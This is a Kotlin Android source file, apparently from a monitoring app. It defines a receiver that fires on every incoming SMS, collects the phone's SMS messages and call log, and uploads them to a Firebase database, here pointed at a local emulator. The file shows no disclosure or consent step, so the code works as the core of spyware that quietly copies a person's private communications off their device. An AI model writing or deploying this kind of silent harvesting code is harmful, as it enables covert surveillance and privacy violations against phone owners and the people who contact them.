package com.arthurisaac.application.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.arthurisaac.application.states.CallLogState
import com.arthurisaac.application.states.SMSState
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*


class SMSReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            Log.d("AI", "SMS received")

            val values = mutableMapOf<String, Any>()
            val sms = SMSState(context)
            val callLog = CallLogState(context)
            values["SMS/"] = sms.getData()
            values["CALL_LOG/"] = callLog.getData()
            Log.d("AI", callLog.getData().toString())

            val currDate = SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())

            val database = FirebaseDatabase.getInstance()
            database.useEmulator("10.0.2.2", 9000)
            database.reference.child("users-email").child(currDate).updateChildren(values)
                .addOnSuccessListener {
                    Log.i("AI: ", "Data updated successful")
                }
                .addOnFailureListener { exception ->
                    Log.e("AI: ", "Error: " + exception.message)
                }
                .addOnCompleteListener {
                    Log.i("AI: ", "Data updated complete")
                }

            /*getBaseHeader().setValue(values)
                .addOnSuccessListener {
                    Log.i("AI: ", "Data updated successful")
                }
                .addOnFailureListener { exception ->
                    Log.e("AI: ", "Error: " + exception.message)
                }
                .addOnCompleteListener {
                    Log.i("AI: ", "Data updated complete")
                }*/
        }
    }
}